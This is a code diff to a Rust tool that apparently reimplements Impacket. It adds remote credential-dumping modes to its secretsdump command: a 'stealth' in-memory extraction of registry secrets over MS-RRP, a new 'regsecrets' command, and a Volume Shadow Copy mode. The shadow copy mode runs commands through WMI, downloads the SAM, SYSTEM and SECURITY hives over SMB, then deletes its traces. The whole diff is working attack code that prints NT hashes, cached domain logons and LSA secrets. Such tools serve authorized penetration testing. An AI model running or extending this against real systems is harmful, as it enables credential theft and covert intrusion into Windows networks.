@@ -144,8 +144,9 @@ fn print_usage() {
     println!("  atq <TARGET> [-path <DIR>] [-info <TASK>] [-xml <TASK>] MS-TSCH (\\PIPE\\atsvc) scheduled task enumerator & inspector");
     println!("  wmiexec <TARGET> \"<command>\" [-share ADMIN$]          WMI Win32_Process exec; output via SMB file");
     println!("  dcomexec <TARGET> \"<command>\" [-object <name>]        DCOM automation exec (MMC20/ShellWindows/ShellBrowserWindow)");
-    println!("  secretsdump <TARGET> [-hashes LM:NT] [-just-dc] [-just-dc-user <user>] [-security] Dump SAM/LSA via RRP or Active Directory credentials via DRSUAPI DCSync");
+    println!("  secretsdump <TARGET> [-hashes LM:NT] [-just-dc] [-just-dc-user <user>] [-security] [-use-vss] [-use-reg] Dump SAM/LSA via RRP/VSS or AD credentials via DRSUAPI DCSync");
     println!("  secretsdump-local <SAM_FILE> <SYSTEM_FILE> [SEC_FILE] Dump local SAM hashes and LSA secrets/cached logons");
+    println!("  regsecrets <TARGET> [-hashes LM:NT] [-security]      Dump SAM/LSA secrets in-memory via RRP (zero disk writes)");
     println!("  ntdsdump <SYSTEM_FILE> <NTDS_FILE>                   Offline Active Directory domain NT/LM hashes dumper");
     println!("  esentutl <DATABASE_FILE> [tables|table <NAME>]        Extensible Storage Engine (ESE) offline database inspector");
     println!("  dpapi <masterkey|blob> <FILE> [-key <HEX>]           Windows DPAPI MasterKey & Blob offline decryptor");
@@ -1817,6 +1818,8 @@ fn cmd_secretsdump(args: &[String]) {
     let mut just_dc_user: Option<String> = None;
     let mut just_dc_ntlm = false;
     let mut dump_security = false;
+    let mut use_vss = false;
+    let mut use_reg = false;
     let mut i = 0;
     while i < args.len() {
         match args[i].as_str() {
@@ -1833,6 +1836,8 @@ fn cmd_secretsdump(args: &[String]) {
                 }
             }
             "-security" | "--security" => dump_security = true,
+            "-use-vss" | "--use-vss" | "-vss" | "--vss" => use_vss = true,
+            "-use-reg" | "--use-reg" | "-reg" | "--reg" | "-stealth" | "--stealth" => use_reg = true,
             _ => {}
         }
         i += 1;
@@ -1976,7 +1981,158 @@ fn cmd_secretsdump(args: &[String]) {
     }
 
     // -------------------------------------------------------------------------
-    // Mode B: Remote Registry (MS-RRP) Hive Extraction
+    // Mode B: Remote Registry (MS-RRP) Direct In-Memory Extraction (regsecrets)
+    // -------------------------------------------------------------------------
+    if use_reg {
+        println!("[*] Extracting secrets directly via MS-RRP (zero remote disk writes)...");
+        let rrp_iface = &WELL_KNOWN_INTERFACES[IFACE_RRP];
+        let run_reg = (|| -> Result<(), CoreError> {
+            let transport = SmbPipeTransport::connect(
+                host, &spec.domain, &spec.username, &cred, "winreg",
+                rrp_iface.uuid, rrp_iface.version_major, rrp_iface.version_minor,
+                spec.compat_profile, DEFAULT_TIMEOUT,
+            )?;
+            let mut rrp = RrpClient::new(transport);
+            let report = impacket_sam::regsecrets_dump(&mut rrp)?;
+
+            println!("[*] BootKey: {}", impacket_core::encode_hex(&report.bootkey));
+            println!();
+            println!("[*] Dumping SAM hashes (uid:rid:lmhash:nthash)");
+            for a in &report.sam_accounts {
+                println!("{}", a.to_secretsdump_line());
+            }
+            println!("[*] {} accounts.", report.sam_accounts.len());
+
+            if dump_security {
+                if !report.cached_logons.is_empty() {
+                    println!();
+                    println!("[*] Dumping cached domain logon information (domain/username:hash)");
+                    for c in &report.cached_logons {
+                        println!("{}", c.format_hashcat());
+                    }
+                    println!("[*] {} cached credentials.", report.cached_logons.len());
+                }
+                if !report.lsa_secrets.is_empty() {
+                    println!();
+                    println!("[*] Dumping LSA Secrets");
+                    for s in &report.lsa_secrets {
+                        if let Some(ref text) = s.secret_text {
+                            println!("{}:{}", s.name, text);
+                        } else {
+                            println!("{}:(hex){}", s.name, impacket_core::encode_hex(&s.secret_raw));
+                        }
+                    }
+                    println!("[*] {} LSA secrets.", report.lsa_secrets.len());
+                }
+            }
+            Ok(())
+        })();
+        if let Err(e) = run_reg {
+            eprintln!("[-] regsecrets error: {}", e);
+            std::process::exit(1);
+        }
+        return;
+    }
+
+    // -------------------------------------------------------------------------
+    // Mode C: Volume Shadow Copy (VSS via WMI) Hive Extraction
+    // -------------------------------------------------------------------------
+    if use_vss {
+        println!("[*] Creating Volume Shadow Copy via WMI (agentless shadow dump)...");
+        let run_vss = (|| -> Result<(), CoreError> {
+            let create_cmd = impacket_sam::shadowcopy::build_shadow_create_command_wmic(r"C:\");
+            let _ = impacket_msrpc::wmiexec(
+                host, &spec.domain, &spec.username, &cred, &create_cmd,
+                Some("ADMIN$"), spec.compat_profile, DEFAULT_TIMEOUT,
+            );
+            let list_cmd = impacket_sam::shadowcopy::build_shadow_list_command();
+            let list_output = impacket_msrpc::wmiexec(
+                host, &spec.domain, &spec.username, &cred, &list_cmd,
+                Some("ADMIN$"), spec.compat_profile, DEFAULT_TIMEOUT,
+            ).unwrap_or_default();
+
+            let shadow_info = impacket_sam::shadowcopy::parse_shadow_list_output(&list_output)?;
+            println!("[*] Created shadow copy: {}", shadow_info.shadow_id);
+            println!("[*] Shadow device: {}", shadow_info.device_path);
+
+            let token = rand_hex();
+            let hives = impacket_sam::shadowcopy::hive_names(dump_security);
+            for h in &hives {
+                let copy_cmd = impacket_sam::shadowcopy::build_hive_copy_command(
+                    &shadow_info.device_path, h, &token,
+                );
+                let _ = impacket_msrpc::wmiexec(
+                    host, &spec.domain, &spec.username, &cred, &copy_cmd,
+                    Some("ADMIN$"), spec.compat_profile, DEFAULT_TIMEOUT,
+                );
+            }
+
+            // Download copied hives via SMB
+            let mut conn = impacket_smb::SmbConnection::connect(host, 445, spec.compat_profile, DEFAULT_TIMEOUT)?;
+            conn.login(&spec.domain, &spec.username, &cred, "impacket-rs")?;
+            conn.tree_connect_share(host, "C$")?;
+
+            let system = conn.read_full_file(&format!(r"Windows\Temp\SYSTEM_{}.hive", token))?;
+            let sam = conn.read_full_file(&format!(r"Windows\Temp\SAM_{}.hive", token))?;
+            let security = if dump_security {
+                conn.read_full_file(&format!(r"Windows\Temp\SECURITY_{}.hive", token)).ok()
+            } else {
+                None
+            };
+
+            // Cleanup temp hive files
+            for h in &hives {
+                let _ = conn.delete_file(&format!(r"Windows\Temp\{}_{}.hive", h, token));
+            }
+
+            // Delete shadow copy
+            let del_cmd = impacket_sam::shadowcopy::build_shadow_delete_command(&shadow_info.shadow_id);
+            let _ = impacket_msrpc::wmiexec(
+                host, &spec.domain, &spec.username, &cred, &del_cmd,
+                Some("ADMIN$"), spec.compat_profile, DEFAULT_TIMEOUT,
+            );
+
+            // Parse downloaded hives
+            let accounts = impacket_sam::secretsdump_local(&sam, &system)?;
+            println!("[*] Dumping SAM hashes (uid:rid:lmhash:nthash)");
+            for a in &accounts {
+                println!("{}", a.to_secretsdump_line());
+            }
+            println!("[*] {} accounts.", accounts.len());
+
+            if let Some(sec_bytes) = security {
+                let bootkey = impacket_sam::bootkey_from_system_hive(&system)?;
+                let lsa = impacket_sam::LsaParser::new(&sec_bytes, bootkey)?;
+                println!();
+                println!("[*] Dumping cached domain logon information");
+                if let Ok(cached) = lsa.dump_cached_hashes() {
+                    for c in &cached {
+                        println!("{}", c.format_hashcat());
+                    }
+                }
+                println!();
+                println!("[*] Dumping LSA Secrets");
+                if let Ok(secrets) = lsa.dump_secrets() {
+                    for s in &secrets {
+                        if let Some(ref text) = s.secret_text {
+                            println!("{}:{}", s.name, text);
+                        } else {
+                            println!("{}:(hex){}", s.name, impacket_core::encode_hex(&s.secret_raw));
+                        }
+                    }
+                }
+            }
+            Ok(())
+        })();
+        if let Err(e) = run_vss {
+            eprintln!("[-] VSS secretsdump error: {}", e);
+            std::process::exit(1);
+        }
+        return;
+    }
+
+    // -------------------------------------------------------------------------
+    // Mode D: Remote Registry (MS-RRP) Hive Extraction
     // -------------------------------------------------------------------------
     let token = rand_hex();
     let hives_to_dump = if dump_security {
@@ -2180,6 +2336,87 @@ fn cmd_secretsdump_local(args: &[String]) {
                 eprintln!("[-] error dumping LSA secrets: {}", e);
             }
         }
+    }
+}
+
+/// Remote regsecrets: extracts BootKey, SAM hashes, and LSA secrets directly via [MS-RRP] without remote disk writes.
+fn cmd_regsecrets(args: &[String]) {
+    use impacket_core::CoreError;
+    use impacket_msrpc::rrp::RrpClient;
+
+    print!("{}", version::BANNER);
+    let spec = match parse_target_with_hashes(args) {
+        Ok(s) => s,
+        Err(e) => {
+            eprintln!("[-] {}", e);
+            std::process::exit(1);
+        }
+    };
+    let cred = match credential_from(&spec) {
+        Ok(c) => c,
+        Err(e) => {
+            eprintln!("[-] {}", e);
+            std::process::exit(1);
+        }
+    };
+    let host = spec.effective_target_ip();
+
+    let mut dump_security = false;
+    for arg in args {
+        if arg == "-security" || arg == "--security" {
+            dump_security = true;
+        }
+    }
+
+    println!("[*] Connecting to Remote Registry (MS-RRP) on {}", host);
+    println!("[*] Extracting secrets directly via memory (zero remote disk writes)...");
+
+    let rrp_iface = &WELL_KNOWN_INTERFACES[IFACE_RRP];
+    let run = (|| -> Result<(), CoreError> {
+        let transport = SmbPipeTransport::connect(
+            host, &spec.domain, &spec.username, &cred, "winreg",
+            rrp_iface.uuid, rrp_iface.version_major, rrp_iface.version_minor,
+            spec.compat_profile, DEFAULT_TIMEOUT,
+        )?;
+        let mut rrp = RrpClient::new(transport);
+        let report = impacket_sam::regsecrets_dump(&mut rrp)?;
+
+        println!("[*] BootKey: {}", impacket_core::encode_hex(&report.bootkey));
+        println!();
+        println!("[*] Dumping SAM hashes (uid:rid:lmhash:nthash)");
+        for a in &report.sam_accounts {
+            println!("{}", a.to_secretsdump_line());
+        }
+        println!("[*] {} accounts.", report.sam_accounts.len());
+
+        if dump_security {
+            if !report.cached_logons.is_empty() {
+                println!();
+                println!("[*] Dumping cached domain logon information (domain/username:hash)");
+                for c in &report.cached_logons {
+                    println!("{}", c.format_hashcat());
+                }
+                println!("[*] {} cached credentials.", report.cached_logons.len());
+            }
+            if !report.lsa_secrets.is_empty() {
+                println!();
+                println!("[*] Dumping LSA Secrets");
+                for s in &report.lsa_secrets {
+                    if let Some(ref text) = s.secret_text {
+                        println!("{}:{}", s.name, text);
+                    } else {
+                        println!("{}:(hex){}", s.name, impacket_core::encode_hex(&s.secret_raw));
+                    }
+                }
+                println!("[*] {} LSA secrets.", report.lsa_secrets.len());
+            }
+        }
+        Ok(())
+    })();
+
+    if let Err(e) = run {
+        eprintln!("[-] regsecrets error: {}", e);
+        std::process::exit(1);
     }
 }
 
@@ -11407,6 +11644,7 @@ fn main() {
         Some("dcomexec") => cmd_dcomexec(&args[1..]),
         Some("secretsdump") => cmd_secretsdump(&args[1..]),
         Some("secretsdump-local") => cmd_secretsdump_local(&args[1..]),
+        Some("regsecrets") | Some("reg-secrets") => cmd_regsecrets(&args[1..]),
         Some("ntdsdump") | Some("ntds-dump") => cmd_ntdsdump(&args[1..]),
         Some("esentutl") => cmd_esentutl(&args[1..]),
         Some("dpapi") => cmd_dpapi(&args[1..]),
